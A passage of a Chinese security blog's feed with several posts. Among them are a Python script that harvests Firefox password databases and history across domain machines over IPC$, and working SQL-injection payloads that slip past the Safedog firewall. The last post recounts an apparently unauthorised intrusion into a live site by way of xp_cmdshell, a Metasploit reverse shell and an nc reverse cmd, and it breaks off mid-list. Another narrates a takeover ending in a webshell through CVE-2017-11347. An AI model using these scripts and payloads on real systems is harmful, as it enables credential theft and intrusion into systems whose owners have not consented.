    <content type="html"><![CDATA[<p>在渗透测试中，获取机器浏览器密码和历史记录是一项必不可少的工作，但考虑在域环境下，机器数量多，一台台获取效率肯定不高，于是用<code>python</code>写了个自动化脚本。<br><a id="more"></a></p><h3 id="解密条件"><a href="#解密条件" class="headerlink" title="解密条件"></a>解密条件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">低版本firefox：logins.json、key3.db、cert8.db</span><br><span class="line">高版本firefox：logins.json、key4.db、cert9.db</span><br><span class="line">其中logins.json是关键，没有它则获取不到浏览器密码</span><br></pre></td></tr></table></figure><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import os,sys</span><br><span class="line">from threading import Thread</span><br><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line">user = sys.argv[1]</span><br><span class="line">pwd = sys.argv[2]</span><br><span class="line">file_open=(&apos;C:\\Users\\public\\downloads\\host.txt&apos;)</span><br><span class="line">def file_name():</span><br><span class="line">try:</span><br><span class="line">for host in open(file_open):</span><br><span class="line">host = host.strip(&apos;\n&apos;)</span><br><span class="line">os.system(&quot;net use \\\\%s %s /user:%s&quot;%(host,pwd,user))</span><br><span class="line">try:</span><br><span class="line">for root, dirs, files in os.walk(&apos;\\\\%s\\c$\\users&apos;%host):</span><br><span class="line">for files in files:</span><br><span class="line">if files == &apos;logins.json&apos;:</span><br><span class="line">#os.chdir(root)</span><br><span class="line">os.system(&quot;copy %s\\logins.json c:\\users\\public\\downloads\\logins.json%s&quot;%(root,host))</span><br><span class="line">os.system(&quot;copy %s\\key3.db c:\\users\\public\\downloads\\key3.db%s&quot;%(root,host))</span><br><span class="line">os.system(&quot;copy %s\\cert8.db c:\\users\\public\\downloads\\cert8.db%s&quot;%(root,host))</span><br><span class="line">os.system(&quot;copy %s\\key4.db c:\\users\\public\\downloads\\key4.db%s&quot;%(root,host))</span><br><span class="line">os.system(&quot;copy %s\\cert9.db c:\\users\\public\\downloads\\cert9.db%s&quot;%(root,host))</span><br><span class="line">if files == &apos;places.sqlite&apos;:</span><br><span class="line">os.system(&quot;copy %s\\places.sqlite c:\\users\\public\\downloads\\places.sqlite%s&quot;%(root,host))</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">finally:</span><br><span class="line">os.system(&quot;net use \\\\%s /del&quot;%host)</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">finally:</span><br><span class="line">zipDir(&apos;C:\\Users\\public\\downloads&apos;,&apos;C:\\Users\\public\\Documents\\key.zip&apos;)</span><br><span class="line"></span><br><span class="line">def zipDir(dirpath,outFullName):</span><br><span class="line">    zip = zipfile.ZipFile(outFullName,&quot;w&quot;,zipfile.ZIP_DEFLATED)</span><br><span class="line">    for root, dirs, files in os.walk(dirpath):</span><br><span class="line">    fpath = root.replace(dirpath,&apos;&apos;)</span><br><span class="line">        for files in files:</span><br><span class="line">            zip.write(os.path.join(root,files),os.path.join(fpath,files))</span><br><span class="line">    zip.close()</span><br><span class="line">t=Thread(target=file_name)</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用参数：</span><br><span class="line">Ipc-FirefoxPassAndHistory.exe username password</span><br></pre></td></tr></table></figure><p>使用说明：将host.txt放在C:\Users\public\downloads目录下，代码会循环判断机器中的logins.json、places.sqlite文件，如存在，则批量获取密码配置文件并自动打包（C:\Users\public\Documents\下的key.zip文件）。为防止文件覆盖及更好地标识文件，复制出来的文件会按照IP重命名，破解时自行改回。<br>exp运行可能会存在报错：用作为当前目录的以上路径启动了CMD.EXE。UNC路径不受支持。默认值设为Windows目录。<br><img src="/images/批量IPC获取域内机器Firefox密码/1.PNG" alt=""><br>报错原因：网络路径下的问题。解决方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hkey_current_user\software\microsoft\command processor&quot; /v &quot;disableunccheck&quot; /t &quot;reg_dword&quot; /d &quot;1&quot; /f</span><br></pre></td></tr></table></figure></p><p>报错问题不大，并不影响使用。</p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/images/批量IPC获取域内机器Firefox密码/2.gif" alt=""></p><h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><p><img src="/images/批量IPC获取域内机器Firefox密码/3.gif" alt=""><br>下载地址：<a href="https://github.com/OneHone/HoneTool/tree/master/Ipc-FirefoxPassAndHistory" target="_blank" rel="noopener">https://github.com/OneHone/HoneTool/tree/master/Ipc-FirefoxPassAndHistory</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在渗透测试中，获取机器浏览器密码和历史记录是一项必不可少的工作，但考虑在域环境下，机器数量多，一台台获取效率肯定不高，于是用&lt;code&gt;python&lt;/code&gt;写了个自动化脚本。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="OneHone.github.io/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="IPC" scheme="OneHone.github.io/tags/IPC/"/>
    
      <category term="PYTHON" scheme="OneHone.github.io/tags/PYTHON/"/>
    
  </entry>
  
  <entry>
    <title>获取MySQL-Workbench本地保存密码</title>
    <link href="OneHone.github.io/2019/06/19/%E8%8E%B7%E5%8F%96MySQL-Workbench%E6%9C%AC%E5%9C%B0%E4%BF%9D%E5%AD%98%E5%AF%86%E7%A0%81/"/>
    <id>OneHone.github.io/2019/06/19/获取MySQL-Workbench本地保存密码/</id>
    <published>2019-06-19T13:18:26.000Z</published>
    <updated>2019-06-20T04:44:04.443Z</updated>
    
    <content type="html"><![CDATA[<p>平时用Navicat比较多，第一次使用<a href="https://dev.mysql.com/downloads/workbench/" target="_blank" rel="noopener">MySQL-Workbench</a>，目的是获取该软件保存在本地的链接信息(IP、端口、账号以及密码)。在网上找了一圈没有找到相关破解教程，于是自己研究了一下。<br><a id="more"></a></p><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">测试版本：MySQL Workbench 8.0.16</span><br><span class="line">测试系统：win7 x64</span><br></pre></td></tr></table></figure><p>安装过程就不说了，直接进入主题。凭猜测该软件会不会像<code>Navicat</code>一样，把链接信息写在注册表上，查询键值即可得到密文。而<code>MySQL Workbench</code>所定位的注册表是这样的：<br><img src="/images/获取MySQL-Workbench本地保存密码/1.PNG" alt=""><br>显然这里的键值并不是我想要的。第二个猜测点是该程序运行时会读取某个配置文件，所以用<code>Procmon</code>监视其的行为<br>流程：先在<code>Workbench</code>里创建一个链接，然后开启监听，再返回到创建页面点击保存。<br><img src="/images/获取MySQL-Workbench本地保存密码/2.PNG" alt=""><br>点击保存后，得到的数据包如下：<br><img src="/images/获取MySQL-Workbench本地保存密码/3.PNG" alt=""><br>最后定位到了<code>workbench_user_data.dat</code>文件，用编辑器打开显示乱码，用<code>IDA</code>看也没找到什么。<br>然后查了一下这文件名还真找到了解密方法，<a href="https://www.donationcoder.com/forum/index.php?topic=41860.msg391762#msg391762" target="_blank" rel="noopener">参考链接</a></p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/images/获取MySQL-Workbench本地保存密码/GIF.gif" alt=""><br>直接是明文</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平时用Navicat比较多，第一次使用&lt;a href=&quot;https://dev.mysql.com/downloads/workbench/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;MySQL-Workbench&lt;/a&gt;，目的是获取该软件保存在本地的链接信息(IP、端口、账号以及密码)。在网上找了一圈没有找到相关破解教程，于是自己研究了一下。&lt;br&gt;
    
    </summary>
    
      <category term="测试工具" scheme="OneHone.github.io/categories/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="MySQL Workbench" scheme="OneHone.github.io/tags/MySQL-Workbench/"/>
    
  </entry>
  
  <entry>
    <title>Go-wget</title>
    <link href="OneHone.github.io/2019/06/15/Go-wget/"/>
    <id>OneHone.github.io/2019/06/15/Go-wget/</id>
    <published>2019-06-15T12:35:30.000Z</published>
    <updated>2019-06-15T15:22:25.734Z</updated>
    
    <content type="html"><![CDATA[<p>之前项目用到，考虑原生的wget有大小限制，所以用Goland写了个。<br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">wget for goland</span><br><span class="line">author:Hone</span><br><span class="line">blog:http://hone.cool</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">        &quot;io&quot;</span><br><span class="line">        &quot;net/http&quot;</span><br><span class="line">        &quot;os&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func DownloadFile(url string, filepath string) &#123;</span><br><span class="line"></span><br><span class="line">        resp, err := http.Get(url)</span><br><span class="line">        check(err)</span><br><span class="line">        defer resp.Body.Close()</span><br><span class="line"></span><br><span class="line">        out, err := os.Create(filepath)</span><br><span class="line">        check(err)</span><br><span class="line">        defer out.Close()</span><br><span class="line"></span><br><span class="line">        // Write the body to file</span><br><span class="line">        _, err = io.Copy(out, resp.Body)</span><br><span class="line">        check(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func check(err error) &#123;</span><br><span class="line">        if err != nil &#123;</span><br><span class="line">                panic(err)</span><br><span class="line">        &#125;</span><br><span class="line">&#125; //End check()</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">DownloadFile(os.Args[1], os.Args[2])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用法：test.exe 远程下载地址 本地保存路径 (注：本地保存路径如有空格需用双引号括起来)<br>例：test.exe <a href="http://xxx.xxx.xxx/x.exe" target="_blank" rel="noopener">http://xxx.xxx.xxx/x.exe</a> “C:\Documents and Settings\Administrator\Desktop\x.exe”</p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/images/[Go]wget/wget.gif" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前项目用到，考虑原生的wget有大小限制，所以用Goland写了个。&lt;br&gt;
    
    </summary>
    
      <category term="测试工具" scheme="OneHone.github.io/categories/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Go" scheme="OneHone.github.io/tags/Go/"/>
    
      <category term="wget" scheme="OneHone.github.io/tags/wget/"/>
    
  </entry>
  
  <entry>
    <title>Metinfo Bypasss安全狗</title>
    <link href="OneHone.github.io/2018/12/05/Metinfo-Bypasss%E5%AE%89%E5%85%A8%E7%8B%97/"/>
    <id>OneHone.github.io/2018/12/05/Metinfo-Bypasss安全狗/</id>
    <published>2018-12-05T14:03:50.000Z</published>
    <updated>2018-12-06T03:14:46.443Z</updated>
    
    <content type="html"><![CDATA[<p>Be yourself<br><a id="more"></a></p><h2 id="网站信息"><a href="#网站信息" class="headerlink" title="网站信息"></a>网站信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Metinfo CMS二次开发</span><br><span class="line">存在注入点 非root权限</span><br><span class="line">安全狗版本不详</span><br></pre></td></tr></table></figure><p>正如上述所说，该站点是二次开发的，没有对传入的参数进行过滤而导致注入漏洞。以下是Getshell过程：</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>之前有发过如何<a href="http://hone.cool/2018/09/07/bypass%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97/" target="_blank" rel="noopener">Bypass安全狗</a>的文章，这里就用其payload进行绕过。<code>and</code> 和<code>order by</code> 判断就略过了，直接套用就行。接下来查看显位</p><h3 id="显位"><a href="#显位" class="headerlink" title="显位"></a>显位</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hone.cool/x.php?id=1 and /*!1=2*/ union /*|--|*/--+%0aselect 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 --+</span><br></pre></td></tr></table></figure><p><img src="/images/Metinfo Bypasss安全狗/1.PNG" alt=""><br>显位:2和14</p><h3 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hone.cool/x.php?id=1 and /*!1=2*/ union /*|--|*/--+%0aselect 1,database(%23%0a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 --+</span><br></pre></td></tr></table></figure><p><img src="/images/Metinfo Bypasss安全狗/2.PNG" alt=""></p><h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hone.cool/x.php?id=1 and /*!1=2*/ union /*|--|*/--+%0aselect 1,table_name,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 from information_schema.tables where table_schema=库名的hex值 --+</span><br></pre></td></tr></table></figure><p><img src="/images/Metinfo Bypasss安全狗/3.PNG" alt=""><br>被安全狗拦截了，经过测试发现，该拦截发生在table_schema与库名hex值之间，即table_schema=0x110120119（拦截），这里用limit的方式逐个读取表名。在此之前可能会有个疑问：CMS是Metinfo，那么读取met_admin_table表就有管理员账密了，为何还要多此一举？原因很简单，该站是二次开发的，把表名给改了，实际情况也是如此，读取met_admin_table显示不存在。<br>于是写了个脚本，循环limit300次，设置访问间隔，以免被BANIP，并判断页面是否存在<code>admin</code>字样，如果有就把该链接保存下来。<br>没过多久结果就跑出来了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hone.cool/x.php?id=1 and /*!1=2*/ union /*|--|*/--+%0aselect 1,table_name,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 from /*|--|*/--+%0ainformation_schema.tables limit 225,1 --+</span><br></pre></td></tr></table></figure></p><p><img src="/images/Metinfo Bypasss安全狗/4.PNG" alt=""><br>表名：xx_admin_table</p><h3 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hone.cool/x.php?id=1 and /*!1=2*/ union /*|--|*/--+%0aselect 1,admin_pass,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 from /*|--|*/--+%0a xx_admin_table--+</span><br></pre></td></tr></table></figure><p><img src="/images/Metinfo Bypasss安全狗/5.PNG" alt=""></p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>解开密码，登入后台<br><img src="/images/Metinfo Bypasss安全狗/6.PNG" alt=""><br>后台有个添加白名单功能，将php后缀添加进去<br><img src="/images/Metinfo Bypasss安全狗/7.PNG" alt=""><br>然后找一个上传的地方将一句话上传<br><img src="/images/Metinfo Bypasss安全狗/8.PNG" alt=""><br>报错：<code>上传图片上传临时文件夹（upload_tmp_dir）不可写或者域名/后台文件夹/include/uploadify.php没有访问权限。</code>查了一下，造成错误的原因可能是php版本的问题，先不管了。<br>该后台还有一个数据库备份的功能<br><img src="/images/Metinfo Bypasss安全狗/9.PNG" alt=""><br>可以上传zip文件，该cms会把上传的zip文件自动解压。<br>因此通过这个特性，把免杀的一句话打包成zip文件，上传即可getshell，结果还是报错了：<br><img src="/images/Metinfo Bypasss安全狗/10.PNG" alt=""><br>报错的原因是该目录没权限，头疼，一时间没有Getshell的点。在后台继续找，发现可以备份网站<br><img src="/images/Metinfo Bypasss安全狗/11.PNG" alt=""><br>把备份下载回来说不定会有前人留下的shell，二话不说直接用D盾扫<br><img src="/images/Metinfo Bypasss安全狗/12.PNG" alt=""><br>看来运气不好，前人留下的只是图片马，没法利用<br><img src="/images/Metinfo Bypasss安全狗/13.PNG" alt=""><br>通过备份文件可知版本号：Metinfo 5.2.7<br><img src="/images/Metinfo Bypasss安全狗/14.PNG" alt=""><br>老版本，有后台权限用<a href="http://tv1314.com/post-514.html" target="_blank" rel="noopener">CVE-2017-11347</a>可秒，将内容为&lt;?php phpinfo()改名成x.jpg，将图片上传后得到一个路径，例如:../upload/201812/thumb/1512051440.jpg<br>然后访问</p><pre><code>http://hone.cool/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|vuln/test1.php&amp;address=../upload/201812/thumb/1512051440.jpg</code></pre><p><img src="/images/Metinfo Bypasss安全狗/15.PNG" alt=""><br>访问后，会在vuln目录下将jpg文件生成php文件<br><img src="/images/Metinfo Bypasss安全狗/16.PNG" alt=""><br>利用该方式将过狗的一句话改名为x.jpg，即可Getshell<br><img src="/images/Metinfo Bypasss安全狗/17.PNG" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Be yourself&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web渗透" scheme="OneHone.github.io/tags/Web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>bypass最新版安全狗</title>
    <link href="OneHone.github.io/2018/09/07/bypass%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97/"/>
    <id>OneHone.github.io/2018/09/07/bypass最新版安全狗/</id>
    <published>2018-09-07T01:09:26.000Z</published>
    <updated>2018-09-07T01:09:37.256Z</updated>
    
    <content type="html"><![CDATA[<p>AKA<br><a id="more"></a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>系统：win7x64+phpstudy+安全狗apache版 v4.0<br>站点：sqli-labs<br><img src="/images/bypass最新版安全狗/1.PNG" alt=""></p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>Mysql 注释符：<code># , -- , /*...*/</code><br>Mysql 空白字符：<code>%09,%0a,%0b,%0c,%0d,%20,%a0</code></p><h3 id="绕过-and-1-1"><a href="#绕过-and-1-1" class="headerlink" title="绕过 and 1=1"></a>绕过 and 1=1</h3><p>首先判断是否有注入点：<br>正常情况：<a href="http://192.11.22.55/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.11.22.55/sqli/Less-1/?id=1&#39;</a> and 1=1 %23 <font color="#dd0000">(安全狗拦截)</font><br>把<code>and 1=1</code>拆分：<br><a href="http://192.11.22.55/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.11.22.55/sqli/Less-1/?id=1&#39;</a> and %23 <font color="#00dd00">(安全狗不拦截)</font><br>所以要把<code>and</code>和<code>1=1</code>当成两部分，在它们之间进行干扰。经过一番测试用<code>/*!..*/</code>就能绕过<br>payload:<code>/*!..*/</code>（在星号后加惊叹号，那么此解释里的语句将被执行）<br><code>http://192.11.22.55/sqli/Less-1/?id=1&#39; and /*!1=1*/ %23</code> <font color="#00dd00">(安全狗不拦截)</font><br><img src="/images/bypass最新版安全狗/2.PNG" alt=""></p><h3 id="绕过-order-by"><a href="#绕过-order-by" class="headerlink" title="绕过 order by"></a>绕过 order by</h3><p>正常情况：<a href="http://192.11.22.55/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.11.22.55/sqli/Less-1/?id=1&#39;</a> order by 1,2,3 %23 <font color="#dd0000">(安全狗拦截)</font><br><a href="http://192.11.22.55/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.11.22.55/sqli/Less-1/?id=1&#39;</a> order by  %23 <font color="#00dd00">(安全狗不拦截)</font><br>所以把<code>order by</code>和<code>1,2,3,x</code>当成两部分，继续干扰。用刚刚的思路<code>/*!..*/</code>绕过<br><code>http://192.11.22.55/sqli/Less-1/?id=1&#39; order by /*!1,2,3*/ %23</code><font color="#00dd00">(安全狗不拦截)</font><br><img src="/images/bypass最新版安全狗/3.PNG" alt=""></p><h3 id="绕过-union-select"><a href="#绕过-union-select" class="headerlink" title="绕过 union select"></a>绕过 union select</h3><p>测试:<a href="http://192.11.22.55/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.11.22.55/sqli/Less-1/?id=-1&#39;</a> UNION SELECT %23 <font color="#dd0000">(安全狗拦截)</font><br>尝试之前的思路<code>union /*!select*/1,2,3</code><font color="#dd0000">(安全狗拦截)</font><br>多次测试之后发现，需要在<code>union</code>和<code>select</code>之间进行干扰，当时这里绕了很久，没绕过去，但总感觉能弄出来。好吧，弄久了没啥灵感就去网上搜搜思路。看到了篇今年5月份的帖子<br><img src="/images/bypass最新版安全狗/4.PNG" alt=""><br>payload:<code>e66union(/*(x/*–*\/)*/select1,2)</code>，结果被杀了<br><img src="/images/bypass最新版安全狗/5.PNG" alt=""><br>上个厕所冷静下，想想到底还漏了哪些字符没有利用到，好吧其实我在刷抖音，刷到了条<code>你的城市那么空，回忆那么凶，嘿咯嘿咯</code>，瞬间充满灵感，是空，空白字符没用到啊！！<br>拿<code>%0a</code>去url解码发现有换行的功能，比如<code>select *from admin where id=-1 union %0aselect 1,2,3</code><br><img src="/images/bypass最新版安全狗/6.PNG" alt=""><br>可以正常的查询<br><img src="/images/bypass最新版安全狗/7.PNG" alt=""><br>于是get到点了，最终payload:<code>union /*|--|*/--+%0aselect 1,2,3</code><br><code>http://192.11.22.55/sqli/Less-1/?id=-1&#39;union /*|--|*/--+%0aselect 1,2,3%23</code><font color="#00dd00">(安全狗不拦截)</font><br><img src="/images/bypass最新版安全狗/8.PNG" alt=""></p><h3 id="绕过-union-select-1-2-3-from-users"><a href="#绕过-union-select-1-2-3-from-users" class="headerlink" title="绕过 union select 1,2,3 from users"></a>绕过 union select 1,2,3 from users</h3><p>利用刚刚绕过<code>union select</code>的payload，即可绕过，总的来说哪里拦截就干扰哪里。<br>payload:<code>union /*|--|*/--+%0aselect 1,username,password from /*|--|*/--+%0ausers limit 1,2</code><br><code>http://192.11.22.55/sqli/Less-1/?id=-1&#39;union /*|--|*/--+%0aselect 1,username,password from /*|--|*/--+%0ausers limit 1,2%23</code><font color="#00dd00">(安全狗不拦截)</font><br><img src="/images/bypass最新版安全狗/9.PNG" alt=""><br>OK，关于绕狗肯定还有很多姿势，慢慢积累。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;AKA&lt;br&gt;
    
    </summary>
    
      <category term="bypass" scheme="OneHone.github.io/categories/bypass/"/>
    
    
      <category term="安全狗" scheme="OneHone.github.io/tags/%E5%AE%89%E5%85%A8%E7%8B%97/"/>
    
  </entry>
  
  <entry>
    <title>某站点的简单测试</title>
    <link href="OneHone.github.io/2018/08/17/%E6%9F%90%E7%AB%99%E7%82%B9%E7%9A%84%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95/"/>
    <id>OneHone.github.io/2018/08/17/某站点的简单测试/</id>
    <published>2018-08-17T02:01:59.000Z</published>
    <updated>2018-08-03T08:07:53.380Z</updated>
    
    <content type="html"><![CDATA[<p>要做有纯粹的事。<br><a id="more"></a></p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>闲来无事</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IP：x.100</span><br><span class="line">端口：80 3389 1433</span><br><span class="line">网站框架：win08+iis7.5+asp aspx</span><br><span class="line">存在sql注入:mssql</span><br></pre></td></tr></table></figure><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>丢到sqlmap跑，发现竟然是个<code>sa</code>注入。<br><img src="/images/某站点的简单测试/1.PNG" alt=""><br><code>--os-shell</code>执行命令报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[11:05:22] [CRITICAL] unable to prompt for an interactive operating system shell via the back-end DBMS because stacked queries SQL injection is not supported</span><br><span class="line">[11:05:22] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 1 times</span><br></pre></td></tr></table></figure></p><p>这里有两条路走<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.翻账密进后台getshell</span><br><span class="line">2.手工开启xp_cmdshell</span><br></pre></td></tr></table></figure></p><h3 id="一、后台"><a href="#一、后台" class="headerlink" title="一、后台"></a>一、后台</h3><p>在后台找到上传点<br><img src="/images/某站点的简单测试/2.PNG" alt=""><br>上传失败，提示：该账号没有权限上传，请联系管理员<br><img src="/images/某站点的简单测试/3.PNG" alt=""><br>明明拿的是管理员账号却没有上传权限，逗我呢？<br>后台没戏，功能点太少，唯独上传文件的点也被禁了。</p><h3 id="二、手工"><a href="#二、手工" class="headerlink" title="二、手工"></a>二、手工</h3><p>既然后台get不到shell，何不看看后台有没有注入点呢。经验一番的测试，存在注入点，于是手工开启<code>xp_cmdshell</code>（第一个前台注点也是可以开启的，但这里用的是后台注入点。）<br>看看<code>mssql</code>是否被降权：<br><img src="/images/某站点的简单测试/4.PNG" alt=""><br>OK，system权限<br>添加用户远程连接进去就差不多完事了，但连接时报错<br><img src="/images/某站点的简单测试/5.PNG" alt=""><br>登入失败，回头执行net user 用户名  查看添加进去的用户确实在<code>Administrators</code>组里，难道是站库分离结构？<br>于是<code>ipconfig /all</code>看下IP<br><img src="/images/某站点的简单测试/6.PNG" alt=""><br>噢嚯，显示不全，类似的， <code>tasklist</code>命令也看不全，换条命令试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get *</span><br></pre></td></tr></table></figure></p><p>查看系统是否安装了杀软，同样显示不全。<br>接下来，在不明确是否有杀软的环境下反弹一个<code>msf</code>的<code>shell</code>回来，<code>msf</code>监听好端口然后利用<code>bistadmin</code>命令将免杀马丢上目标机运行<br><img src="/images/某站点的简单测试/7.PNG" alt=""><br>成功接受到shell，但是执行完第一条之后就被杀了。看了一下<code>virustotal.com</code>报告<br><img src="/images/某站点的简单测试/8.PNG" alt=""><br>百度杀软额外的亮眼、言归正传，马子被杀了，那就换一个，找了个免杀<code>nc.dll</code>反弹<code>cmd</code><br><img src="/images/某站点的简单测试/9.PNG" alt=""><br>OK，看看到底是哪路杀软<br><img src="/images/某站点的简单测试/10.PNG" alt=""><br>微软MsMpEng.exe</p><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo --&gt;Windows Serverr 2008 Standard x64 工作组</span><br><span class="line">ipconfig --&gt;x.101（公网）</span><br><span class="line">tasklist --&gt; 